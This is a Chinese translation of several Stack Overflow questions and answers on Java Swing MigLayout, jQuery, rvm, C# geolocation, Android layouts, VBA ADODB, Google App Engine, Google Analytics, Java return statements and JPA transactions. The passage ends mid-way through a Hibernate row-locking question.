> 标签：java, swing, layout, miglayout, gaps-in-visuals

非常简单的问题：如何消除包含两者的两个单元格之间的垂直间隙`JCheckBox`？我用红色边框标记了图片中的空白。

![差距](../Images/efddbe6a855562561c120dc44763bedd.png)

这是代码：

```
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JPanel;

import net.miginfocom.swing.MigLayout;

public class Main {
    public static void main(String[] args) {
        JPanel somePanel = new JPanel();
        somePanel.setLayout(new MigLayout("insets 0, debug", "", ""));
        somePanel.add(new JCheckBox("first option"), "h 20!");
        somePanel.add(new JButton("click me"), "spany 2, h 40!, w 60%, wrap");
        somePanel.add(new JCheckBox("option two"), "h 20!");

        JFrame frame = new JFrame();
        frame.setContentPane(somePanel);
        frame.pack();
        frame.setVisible(true);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-30T10:34:23.023

如果它们应该仅应用于特定的行/列之间，则在行/列约束中定义最小间隙：

```
new MigLayout("insets 0, debug", "", "[]0[]")); 
```

（有点想知道这对你没用？这里很好:)

或者在 layoutContraints 中是否应该在所有行之间应用它们：

```
new MigLayout("insets 0, gapy 0, debug")); 
```

顺便说一句：布局“编码”应该遵循与所有编码相同的规则，fi DRY :-) 特别是，如果您可以通过布局/行约束实现目标，我的规则是不要重复组件约束。在示例中，您可以摆脱除跨越之外的所有组件约束：

```
somePanel.setLayout(new MigLayout("insets 0, debug, wrap 2", 
        "[][60%, fill]", "[20!, fill]0"));
somePanel.add(new JCheckBox("first option"));
somePanel.add(new JButton("click me"), "spany 2");
somePanel.add(new JCheckBox("option two")); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:37:55.137

好的，我刚刚找到了一个使用对接的好解决方案：

```
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JPanel;

import net.miginfocom.swing.MigLayout;

public class Main {
    public static void main(String[] args) {
        JPanel somePanel = new JPanel();
        somePanel.setLayout(new MigLayout("insets 0, debug", "", ""));
        somePanel.add(new JButton("click me"), "east");
        somePanel.add(new JCheckBox("first option"), "north");
        somePanel.add(new JCheckBox("option two"), "south");

        JFrame frame = new JFrame();
        frame.setContentPane(somePanel);
        frame.pack();
        frame.setVisible(true);
    }
} 
```

**但是，如果不能选择对接，我该怎么做？**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-08-25T15:44:50.667

另一种解决方案是将单元格拆分为两个子单元格，将复选框放在那里，然后应用组件间隙约束。

```
package com.zetcode;

import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.SwingUtilities;

import net.miginfocom.swing.MigLayout;

/*
Demonstrating component gaps in MigLayout manager.
Author: Jan Bodnar
Website: zetcode.com
 */
public class MigLayoutGapsEx extends JFrame {

    public MigLayoutGapsEx() {

        initUI();
    }

    private void initUI() {

        JCheckBox cb1 = new JCheckBox("First option");
        JCheckBox cb2 = new JCheckBox("Second option");

        JButton btn = new JButton("Click me");

        createLayout(cb1, cb2, btn);

        setTitle("MigLayout example");
        setLocationRelativeTo(null);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    private void createLayout(JComponent... arg) {

        setLayout(new MigLayout());

        add(arg[0], "split 2, flowy");
        add(arg[1], "gapy 0");
        add(arg[2]);

        pack();
    }

    public static void main(String[] args) {

        SwingUtilities.invokeLater(() -> {
            MigLayoutGapsEx ex = new MigLayoutGapsEx();
            ex.setVisible(true);
        });
    }
} 
```

这是屏幕截图：

[![示例截图](../Images/e4a3280114f5e2f7fd7bdc31d3275621.png)](https://i.stack.imgur.com/T6dNi.png)

# javascript - 通过事件指针/引用取消绑定特定的 Jquery 事件

> ID：13125790
> 
> 赞同：1
> 
> 时间：2012-10-29T16:32:44.337
> 
> 标签：javascript, jquery

我需要的是这样的：

```
var MyEventPointer = $('body').on('MyCustomEvent','.myClass',function(e){
   // do something
});

var MyEventPointer2 = $('body').on('MyCustomEvent','.myClass',function(e){
   // do something
});

$('body').unbindByEventID(MyEventPointer); 
```

`MyEventPointer`是指向特定事件处理程序的指针。尽管这两个事件处理程序完全相同，但只有一个是未绑定的，因为它们具有不同的唯一标识符，在创建时返回。这应该像我可以在变量中存储对计时器的引用并稍后使用它的引用再次禁用计时器的方式一样工作。我知道 Jquery 存储事件的唯一 ID，但我不知道我是否可以找到它们。这可能与 Jquery 相关还是我需要扮演自己的解决方案？需要委托该事件，以便包括当前和未来的实例`.myClass`。

## 更新：

**示例代码：**

```
<tr><td><input class="MyWidget" /></td></tr>
<tr><td><input class="MyWidget" /></td></tr>
<tr><td><input class="MyWidget" /></td></tr>
<!-- Repeats n times, rows are added and deleted dynamically --> 
```

**JavaScript：**

```
// Creation
$('.MyWidget').MyWidget();

// The plugin
$.fn.MyWidget = function (options) {
   return this.each(function () {
      new ATK.MyWidget(this, options);
   });
};

// The widget class
ATK.MyWidget = function (element, options) {
   // constructor
}
ATK.MyWidget.prototype = new ATK.ParentWidget();

ATK.MyWidget.prototype.SetFilterEvent = function(Selector) {
   var base = this;   
   $('body').on('MyCustomEvent',Selector,function(e){base.eMyCustomEvent(e,this)});
}

ATK.MyWidget.prototype.eMyCustomEvent = function(e,eventThis) {
   console.log(this.protected.$element.attr('id')+' has detected that '+$(eventThis).attr('id')+' has changed.');
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:43:54.313

你可以这样做：

```
function MyEventPointer1(e){
   // do something
});

function MyEventPointer2(e){
   // do something
});

$('body').on('MyCustomEvent','.myClass', MyEventPointer1);
$('body').on('MyCustomEvent','.myClass', MyEventPointer2);

$('body').off('MyCustomEvent','.myClass', MyEventPointer1); 
```

* * *

更具体地说，在您使用类的情况下，您可以轻松应用上述模式并且它可以工作：

```
ATK.MyWidget.prototype.SetFilterEvent = function(Selector) {
    this.event = function(e) {this.eMyCustomEvent(e, this);}
    $('body').on('MyCustomEvent',Selector,this.event);
}

ATK.MyWidget.prototype.RemoveFilterEvent = function(Selector) {
    $('body').off('MyCustomEvent',Selector,this.event);
} 
```

（您可能需要检查以确保 this.event 不为 null 并在构造函数中将其设置为 null，或者在构造函数中将 this.event 声明为 this 函数或类似的东西可能更有效，但是这基本上可以完成工作。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T17:22:56.400

如果你想在一个元素上使用不同的相同事件，我的意思是如果你想在同一个元素上注册多个事件处理程序，那么你可以使用`event namespace`，即

```
$('body').on('MyCustomEvent.nameSpaceOne','.myClass',function(e){
    // do something
});

$('body').on('MyCustomEvent.nameSpaceTwo','.myClass',function(e){
    // do something
}); 
```

`event namespace`使用and 在这种情况下删除第一个处理程序；s`nameSpaceOne`

```
$('body').off('MyCustomEvent.nameSpaceOne', '.myClass'); 
```

[**一个例子在这里**](http://jsfiddle.net/GhYf5/1/)。

# cucumber - rvm & 重复环境变量 (rubymotion)

> ID：13125791
> 
> 赞同：1
> 
> 时间：2012-10-29T16:32:46.570
> 
> 标签：cucumber, rvm, environment-variables, rubymotion, frank

我想我安装了两次 gem，但我不知道如何卸载其中一个。当我尝试构建我的 ruby​​motion 项目时，我收到以下警告：

```
/Users/pachun/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.2.1/lib/Bundler.rb:12: warning: already initialized constant ORIGINAL_ENV
/Users/pachun/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.2.1/lib/Bundler.rb:64: warning: already initialized constant WINDOWS
/Users/pachun/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.2.1/lib/Bundler.rb:65: warning: already initialized constant FREEBSD
/Users/pachun/.rvm/gems/ruby-1.9.3-p194@global/gems/bundler-1.2.1/lib/Bundler.rb:66: warning: already initialized constant NULL 
```

常规构建仍然有效，但我认为这导致我的测试套件（frank cucumber）失败。

我怎样才能解决这个问题？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T22:15:00.263

使用 rvm 删除所有 gem 并重新安装的最简单方法是执行以下操作：

```
rvm gemset empty <gemset name>
bundle 
```

我建议您制作一个`.rvmrc`文件并放入以下内容，而不是这样做：

```
rvm use 1.9.3@projectname --create 
```

将文件保存到您的项目文件夹，然后 cd 出来并返回到该文件夹​​，对是否加载`.rvmrc`文件的问题回答“Y”。这会将您切换到一个新的（空）gemset，您可以重新运行`bundle`.

# c# - 在 Windows 8 桌面应用程序中获取位置

> ID：13125793
> 
> 赞同：4
> 
> 时间：2012-10-29T16:32:52.780
> 
> 标签：c#, windows-8, desktop-application

我是 C# 的初学者，但我经常使用 Java。我正在尝试在我的应用程序中使用以下代码来获取位置数据。我正在制作一个 Windows 8 桌面应用程序以在我的设备中使用 GPS 传感器：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Windows.Devices.Sensors;
using Windows.Devices.Geolocation;
using Windows.Devices.Geolocation.Geoposition;
using Windows.Foundation;

namespace Hello_Location
{
    public partial class Form1 :
    {
        public Form1()
        {
            InitializeComponent();
        }

        async private void Form1_Load(object sender, EventArgs e)
        {
            Geolocator loc = new Geolocator();
            try
            {
                loc.DesiredAccuracy = PositionAccuracy.High;
                Geoposition pos = await loc.GetGeopositionAsync();
                var lat = pos.Coordinate.Latitude;
                var lang = pos.Coordinate.Longitude;
                Console.WriteLine(lat+ " " +lang);
            }
            catch (System.UnauthorizedAccessException)
            {
                // handle error
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }
    }
} 
```

我收到此错误：

> 'await' 要求类型 'Windows.Foundation.IAsyncOperation' 具有合适的 GetAwaiter 方法。您是否缺少“系统”的使用指令？C:\Users\clidy\documents\visual studio 2012\Projects\Hello-Location\Hello-Location\Form1.cs

我怎样才能解决这个问题？

**此外，如果您可以向我指出一些 C# 位置资源和 Windows桌面**应用程序的传感器 API，这将非常有用。谷歌搜索后，我只获得了 Windows RT API。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-01T14:28:57.097

要解决您的错误，您必须参考Bart 在问题评论之一中给出的[链接。](http://software.intel.com/en-us/articles/using-winrt-apis-from-desktop-applications)

> 如果您使用 Windows 运行时事件处理程序等映射类型，您可能还需要添加对 System.Runtime.WindowsRuntime.dll 的引用：
> 
> ...
> 
> 该程序集位于 C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework.NETCore\v4.5

我最近找到了一个类似问题的“*解决方案”：* [C# 桌面应用程序不共享我的物理位置](https://stackoverflow.com/questions/14435585/c-sharp-desktop-application-doesnt-share-my-physical-location/14645837#14645837)。也许您可能会对我的方法感兴趣：[https](https://stackoverflow.com/a/14645837/674700) ://stackoverflow.com/a/14645837/674700 。

它更像是一种解决方法，它不是针对 Windows 8，但它最终可以工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T19:12:11.197

亚历克斯的解决方案有效！添加该参考和地理定位 api 开始像魅力一样工作！其他传感器的异步方法也是如此！

这是我刚刚开始使用的一个功能。

```
async public void UseGeoLocation()
{
    Geolocator _GeoLocator = new Geolocator();
    Geoposition _GeoPosition = 
        await _GeoLocator.GetGeopositionAsync();

    Clipboard.Clear();
    Clipboard.SetText("latitude," + 
        _GeoPosition.Coordinate.Latitude.ToString() + 
        "," + "longitude," + _GeoPosition.Coordinate.Longitude.ToString() + 
        "," + "heading," + _GeoPosition.Coordinate.Heading.ToString() +
        "," + "speed," + _GeoPosition.Coordinate.Speed.ToString());

    Application.Exit();
} 
```

# android - 如何在 4.6 英寸和 3.7 英寸的正常布局中管理视图

> ID：13125801
> 
> 赞同：1
> 
> 时间：2012-10-29T16:33:04.797
> 
> 标签：android, android-layout, android-intent

我已经实现了从 layout-small 到 layout-xlarge 的布局文件夹。但是对于nexus one和nexus的播放暂停按钮会自动排列并且看起来不同，对于galaxy nexus和samsung s3按钮的排列方式不同但是两者都使用默认正常的相同xml..small和large和xlarge工作正常。任何人都知道我该如何安排项目，使其在两个设备上看起来都一样......

我希望它看起来像这样 ![在此处输入图像描述](../Images/c2be40069645838cf646fe9f44cfb214.png)

这是我的代码

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="@drawable/play_background"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/ff"
        android:layout_width="fill_parent"
        android:layout_height="350dp"
        android:scaleType="fitXY"
        android:src="@drawable/test_play_image" />

    <TextView
        android:id="@+id/metadata"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_below="@+id/ff"
        android:gravity="center"
        android:text="WUMM - D Light "
        android:textColor="@android:color/white"
        android:textSize="18dp" />

    <Button
        android:id="@+id/like"
        style="?android:attr/buttonStyleSmall"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:layout_alignParentRight="true"
        android:text="default Like" />

    <Button
        android:id="@+id/play"
        style="?android:attr/buttonStyleSmall"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@+id/metadata"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="18dp"
        android:background="@drawable/ch_play" />

    <Button
        android:id="@+id/back"
        style="?android:attr/buttonStyleSmall"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignBaseline="@+id/play"
        android:layout_alignBottom="@+id/play"
        android:layout_marginRight="30dp"
        android:layout_toLeftOf="@+id/play"
        android:background="@drawable/back" />

    <Button
        android:id="@+id/forward"
        style="?android:attr/buttonStyleSmall"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignBaseline="@+id/play"
        android:layout_alignBottom="@+id/play"
        android:layout_marginLeft="40dp"
        android:layout_toRightOf="@+id/play"
        android:background="@drawable/forward" />

</RelativeLayout> 
```

但我在 NEXUS ONE 和 S 上看起来像这样 ![在此处输入图像描述](../Images/62c8af74cd87fcfeee68c2011381ff62.png)

这是银河系的屏幕截图 ![在此处输入图像描述](../Images/3fc55dc6903a527764de1e55ddb53145.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:36:54.557

首先你通过这个教程，在这里，你可以学习多种屏幕尺寸或分辨率支持

[屏幕支持](http://developer.android.com/guide/practices/screens_support.html)

[屏幕尺寸支持](http://developer.android.com/training/multiscreen/screensizes.html)

[为多屏设计图像、图标](http://developer.android.com/training/multiscreen/index.html)

# vba - vba中的对象变量错误

> ID：13125802
> 
> 赞同：0
> 
> 时间：2012-10-29T16:33:07.727
> 
> 标签：vba

尝试创建用户名/密码验证表单。当我单击登录按钮即 comamand1_click() 时，出现以下错误“对象变量或未设置块变量”。当我点击调试它指向

```
> rs.ActiveConnection = conn 
```

我输入的代码：

```
Dim a
Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Private Sub Command1_Click()
Set conn = New ADODB.Connection
conn.ConnectionString = "Provider = Microsoft.ACE.OLEDB.12.0; Data Source = C:\VB Project\logindetails1.mdb"
conn.Open

If conn = Null Then
    MsgBox ("no db")
    End
End If

rs.ActiveConnection = conn
rs.Source = "select * from login"
rs.Open

rs.MoveFirst
While Not rs.EOF
If Text1.Text = rs.Fields("id") And Text2.Text = rs.Fields("password") Then
    a = 1
Else
    a = 0
End If
Wend
rs.Close
conn.Close
Set rs = Nothing
Set conn = Nothing

If a = 1 Then
    MsgBox ("Login Successful!!")
Else
    MsgBox ("Invalid Details!!")
End If
End Sub

Private Sub Command2_Click()
Text1.Text = ""
Text2.Text = ""
End Sub

Private Sub Command3_Click()
End
End Sub 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-29T16:35:35.790

我认为你的 rs( `ADODB.Recordset`) 变量是`Nothing`.

您需要创建对象。

```
Set rs = New ADODB.Recordset 
```

另外，我认为您`Set`在设置记录集的连接时需要使用关键字：

```
Set rs.ActiveConnection = conn 
```

# google-app-engine - 我可以在 Google App Engine 上使用免费的云数据库吗？

> ID：13125804
> 
> 赞同：1
> 
> 时间：2012-10-29T16:33:19.803
> 
> 标签：google-app-engine, web-applications, web-hosting

我使用**GWT**构建了一个简单的**Web 应用程序**并将其部署到**Google App Engine**现在我想构建我的数据库并将其集成到我的网站我搜索它所有我发现的是**Google Cloud SQL** 我必须为此付费

 ******任何免费的解决方案。我只想为 1 个用户构建简单的项目

*提示：数据库使用**MYSQL**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T17:00:01.407

只有一种方法可以获得免费的解决方案：

1.  您需要学习 Google App Engine Datastore。这是使用 MySQL 等数据库的另一种选择。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T16:50:04.647

现在有 Google Cloud SQL 的介绍性免费试用版。

[https://developers.google.com/cloud-sql/docs/billing](https://developers.google.com/cloud-sql/docs/billing)******

# javascript - Google Analytics 跟踪代码不会在“第 3 方”域上触发

> ID：13125805
> 
> 赞同：1
> 
> 时间：2012-10-29T16:33:25.013
> 
> 标签：javascript, html, google-analytics

相关网站上的跟踪代码“site2”如下所示：

```
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-XXXXXXXX-1']);
  _gaq.push(['_setDomainName', 'site1.com']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</body>
</html> 
```

这是该站点上调试器的屏幕截图：

![GA Debug 截图](../Images/ec65c176716d0d3d4a77175158656653.png)

前面域上的 _setDomainName 方法，“site1”之前有一个句点：

```
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-XXXXXXXX-1']);
  _gaq.push(['_setDomainName', '.site1.com']);
  _gaq.push(['_setAllowLinker', true]);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script> 
```

虽然这可能会或可能不会阻止 cookie 传递到第二个域，但跟踪代码至少仍应触发，不是吗？**重要的是要注意我们拥有这两个域**。我找不到任何会导致代码不触发的原因，除了页面上其他地方可能出现错误。我正在使用 GA Debug 来查看是否正在发送信标。它正在站点 1 上发送，但不在站点 2 上。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T10:51:04.110

`_setDomainName`告诉 Google Analytics cookie 将自己存储在哪里。`site1.com`浏览器不允许在from上设置 cookie `site2.com`。留在您的主站点上并在您的第二个`.site1.com`站点上更新它。`.site2.com`

如果您想访问域之间的数据，您必须执行以下操作之一：

*   使用 linkByPost 等标记域之间的链接...在此处阅读有关它的 google 文档：[https ://developers.google.com/analytics/devguides/collection/gajs/gaTrackingSite](https://developers.google.com/analytics/devguides/collection/gajs/gaTrackingSite)
*   或者，我建议您研究一下 Google Analytics on Steroids，因为他们可以更优雅地解决这个用例：[https ://github.com/CardinalPath/gas#cross-domain](https://github.com/CardinalPath/gas#cross-domain)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T19:54:04.027

我认为您不需要域名前的句点。根据谷歌分析指南，您应该使用以下格式。

```
<script>
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-12345-1']);
_gaq.push(['_setDomainName', 'example-petstore.com']);
_gaq.push(['_trackPageview']);
</script> 
```

[https://developers.google.com/analytics/devguides/collection/gajs/gaTrackingSite#domainSubDomains](https://developers.google.com/analytics/devguides/collection/gajs/gaTrackingSite#domainSubDomains)

# java - 如何将void语句转换为返回字符串的return语句？

> ID：13125807
> 
> 赞同：1
> 
> 时间：2012-10-29T16:33:34.917
> 
> 标签：java, apache-pig

好吧，所以我尝试将下面的语句转换为返回语句，`finalString`但它总是告诉我，即使我确实返回`finalString`“此语句必须返回字符串类型的变量”。我已经尝试将`return finalString`每个单独的 if 语句放入 for 语句中，但它不起作用。我将不胜感激任何帮助或建议。[更新代码] 仍然不起作用。finalString 值不会被 if 语句修改，这正是我想要它做的。我认为也许 finalString 值没有通过 if 语句？

[代码]

```
import java.util.Scanner;
public class pLat//pig latin program
{

    /**
       * Method to test whether a character is a letter or not.
       * @param c The character to test
       * @return True if it's a letter
       */
      private static boolean isLetter(char c) {
        return ( (c >='A' && c <='Z') || (c >='a' && c <='z') );
      }

    ///////////////////////////////////////////
      private static String output(String input)//processes the word using basic rules including the q and u rule
      {

          //the string that will hold the value of the word entered by the user
          char s;//the first character of the string
          char m;
          int l = input.length();//determines the length of the string
          String endString;
          String startString;
          String finalString = ""; //the final output
          String mtr;
          String lowercase;//the entered string all converted to lowercase

          for(int k =0;k<l;k++)//checks all letters in order to see which is a vowel
          {

              s = input.charAt(k);

          if(s == 'q'|| s=='Q' && input.charAt(k+1)=='u')//if the first vowel is a "u" and the letter before it is a "q"
          {

                  endString = input.substring(0,k+2);//makes the endString also include u
                  endString = endString +"ay";
                  startString = input.substring(k+2,l);
                  finalString = startString + endString;
                  //System.out.println(finalString);
                  return finalString;

          }

          if(s=='a'||s=='e'||s=='i'||s=='o'||s=='u'||s=='A'||s=='E'||s=='I'||s=='O'||s=='U'||s=='y'||s=='Y')//if its a vowel or "y" than executes commands below
          {

              endString = input.substring(0, k);//gets the letters before the vowel
              endString = endString + "ay";
              startString = input.substring(k,l);//gets the letters after the vowel
              finalString = startString + endString;
              //System.out.println(finalString);//prints the final result which is the combination of startString with endString
              //stops code after doing the above
              return finalString;

          }

          else if(k==l-1)//if its the end of the word
          {
              finalString = "ERROR";
              return finalString;

          }

         }
          System.out.println(finalString);
          return finalString;
}///////////////////////////////////

//   public static void process(String input)//will take care of the punctuation
//   {
//       String latin = "";
//          int i = 0;
//          while (i<input.length()) {
//
//            // Takes care of punctuation and spaces
//            while (i<input.length() && !isLetter(input.charAt(i))) {
//              latin = latin + input.charAt(i);
//              i++;
//            }
//            latin = latin + output(input);
//            System.out.println(latin);
//          }
//          
//    }

    public static void main(String[] args)
    {

        String str;//this will be the input string by the user
        Scanner scanner = new Scanner(System.in);//this scanner will register the input value
        System.out.println("Enter a Word: ");
        str = scanner.next();//stores the input string

        output(str);//outputs it using basic gramatical rules

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:43:33.967

您应该在方法的每个本地块中都有一个`return`语句。`top-level`如果你没有它，那么在顶层块`return`的每个内部都有一个声明。`block`等等。

*让我们考虑一组最简单的情况* **`if - else if - else`**： -

`if`您需要从每个或块内返回您的字符串`else`，因为只有其中一个会执行。因此，如果您在其中一个中错过了 return 语句，那么很可能在`block`执行该语句时，它肯定会错过 return 语句。前提是您在结束时没有任何退货声明`method`

因此，基本上，您的 return 语句必须出现在每个块中，其执行不需要执行任何其他块，并且如果这些块涵盖了条件可能具有的所有可能性，那么您不需要在块。因为其中一个块肯定会执行。

此外，如果这些`blocks`不能涵盖某个条件`(like if you are not having an`else的所有可能性`for a set of if-else-if)`，那么您必须`return`在这些块之外有一个语句。因为，如果这些块都没有执行，那么`method`将错过 return 语句。

**因此，例如，您可以看到以下代码集，涵盖了最可能的可能性：-**

```
public String returnString() {
        if (..) {
             return "someString";

        } else if (...) {
             return "someString";

        } else {
             return "someOtherString";
        }
       // return statement here is not needed. Because at least `else` will execute
} 
```

因此，至少其中一个`if`,`else if`或`else`将始终执行。因此，您可以在其中添加 return 语句，并将 return 语句留在这些块之外。

但是，如果您的最后一个`else`块是`else if`，那么可能没有`blocks`执行。在这种情况下，您必须在这些块之后放置一个 return 语句。

```
public String returnString() {
        if (..) {
             return "someString";

        } else if (...) {
             return "someString";

        } else if (...){
             return "someOtherString";
        }
       // return statement here is needed. 
       // Because its possible that none of the blocks in `if-else` set get executed.
} 
```

另一种可能性是，不是从每个块返回，您可以将 存储`return value`在某个局部变量中，并在所有块的末尾，将`value`局部变量的返回作为方法中的最后一条语句。

```
public String returnString() {
    int returnValue = 0;
    if (..) { returnValue = someValue; }
    else if(...) { returnValue = someOtherValue; }

    return returnValue;
} 
```

**注意： -**您可以在代码中使用最后一种方式，因为您将`return value`. `finalString`因此，只需在方法的最后一行返回该字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:36:21.217

```
private static String output(String input)//processes the word using basic rules including the q and u rule
{

    //the string that will hold the value of the word entered by the user
    char s;//the first character of the string
    char m;
    int l = input.length();//determines the length of the string
    String endString;
    String startString;
    String finalString;//the final output
    String mtr;
    String lowercase;//the entered string all converted to lowercase

    for(int k =0;k<l;k++)//checks all letters in order to see which is a vowel
    {

        s = input.charAt(k);

    if(s == 'q'|| s=='Q' && input.charAt(k+1)=='u')//if the first vowel is a "u" and the letter before it is a "q"
    {

            endString = input.substring(0,k+2);//makes the endString also include u
            endString = endString +"ay";
            startString = input.substring(k+2,l);
            finalString = startString + endString;
            System.out.println(finalString);
            break;

    }

    if(s=='a'||s=='e'||s=='i'||s=='o'||s=='u'||s=='A'||s=='E'||s=='I'||s=='O'||s=='U'||s=='y'||s=='Y')//if its a vowel or "y" than executes commands below
    {

        endString = input.substring(0, k);//gets the letters before the vowel
        endString = endString + "ay";
        startString = input.substring(k,l);//gets the letters after the vowel
        finalString = startString + endString;
        System.out.println(finalString);//prints the final result which is the combination of startString with endString
        break;//stops code after doing the above

    }

    else if(k==l-1)//if its the end of the word
    {
        System.out.println("ERROR");
        break;
    }
   }
   return finalString;
} 
```

这里。尝试这个 ：-/

我不知道你想做什么。如果您跳出循环，您将超出`for()`or `while()`or`do..while()`循环，在您的情况下，这几乎是该方法的结束。我将 return finalString 放在那里，并将方法的返回类型`output`从`void`更改为`String`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T21:03:29.353

抱歉，这不是一个真正的答案，Rohit Jain 很好地解释了为什么您的代码不起作用。从那里你应该能够弄清楚。

看着你的代码，我觉得这段代码比它需要的复杂得多。当我将代码粘贴到其中时，我的 IDE（Eclipse）会警告我未使用的变量。正如您的案例所述，拥有复杂的代码是导致问题的原因。

我认为在您的情况下，进行一些重构会有所帮助。而且你没有问题。为了让您开始，请尝试将寻找将字符串一分为二的位置和实际切割的问题分开。那应该有帮助。也许是这样的：

```
private static int firstVowel(String input) {
    for (int i = 0; i < input.length(); i++) {
        char aChar = input.charAt(i);
        if ("aeiouyAEIOUY".indexOf(aChar) >= 0) {
            if (aChar == 'u' && i > 0 && Character.toLowerCase(input.charAt(i-1)) == 'q') {
                return i-1;
            }
            // else
            return i;
        }
    }
    // if we get here no vowel was found
    return -1;
}

// /////////////////////////////////////////
private static String output(String input)
{
    int firstVowel = firstVowel(input);
    if (firstVowel < 0) {
        return "ERROR";
    }
    // else
    String start = input.substring(firstVowel);
    String end = input.substring(0, firstVowel) + "ay";
    return start + end;
}// /////////////////////////////////

public static void main(String[] args) {

    String str;// this will be the input string by the user
    Scanner scanner = new Scanner(System.in);// this scanner will register
                                                // the input value
    System.out.println("Enter a Word: ");
    str = scanner.next();// stores the input string

    System.out.println(output(str));// outputs it using basic gramatical rules

} 
```

# java - getEntityManager.perist(object) 之后如何提交和回滚数据

> ID：13125809
> 
> 赞同：1
> 
> 时间：2012-10-29T16:33:38.833
> 
> 标签：java, hibernate, jpa, fluent-nhibernate, hibernate-entitymanager

现在我将 jpa 与 hibernate 一起使用，当我完成 getEntityManager.persist(objects) 后，我将要求用户确认，例如使用用户界面继续和回滚

```
private List<TempCustomers> tempCustomer =new ArrayList<TempCustomers>();

 @Begin(join = true)
    public String migrateData() {

    log.info("Mobee Migrate Customer Size  :"+doTempCustomers.size());

            for(DoTempCustomers tempCustomers:doTempCustomers){
            try {

                TempCustomers temp=new TempCustomers();
                BeanUtils.copyProperties(temp, tempCustomers);

                tempCustomer.add(temp);
                getEntityManager().persist(temp);

            }catch (Exception e) {
                // TODO: handle exception
                return "null";
            }

             }
            log.info("Size........."+tempCustomer.size());
            return "null";
    }

@Begin(join = true)
    public String updatedData(){
         log.info("Size of Customers :"+tempCustomer.size());
         log.info("Decision ..."+decision);

        try{    
       if(decision.equals("Continue")){
        for(TempCustomers tempCust:tempCustomer){

            TempCustomers temp=new TempCustomers();
            BeanUtils.copyProperties(temp, tempCust);   

            log.info("updated Sucessfully");

           getEntityManager().getTransaction().commit();

       }}else{
           getEntityManager().getTransaction().rollback();

        }
        }
        catch(Exception e){

        }
} 
```

当 getEntityManager().persist() 完成时，请帮助我如何使用休眠在 jpa 中继续和回滚。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:38:03.810

使用 JPA 提交：

```
entityManager.getTransaction().commit(); 
```

使用 JPA 回滚：

```
entityManager.getTransaction().rollback(); 
```

在您调用后调用这些方法中的任何一个以持久执行所需的操作。在您的情况下`entityManager`，将替换为检索 entityManager 的调用，`getEntityManager()`

**参考：** [http ://www.objectdb.com/java/jpa/persistence/store](http://www.objectdb.com/java/jpa/persistence/store)

# mysql - 如何使用 Hibernate 查询语言实现行级锁定？

> ID：13125813
> 
> 赞同：1
> 
> 时间：2012-10-29T16:33:59.830
> 
> 标签：mysql, database, hibernate, locking

背景：我正在研究一个 MYSql 数据库，其中多个实例从同一个 Account Table 读取。我想使用 Hibernate 查询语言实现行级独占锁以避免脏读。

我的代码如下。

```
List<AccountTableBean> currentRequestslist = sessionFactory.getCurrentSession()
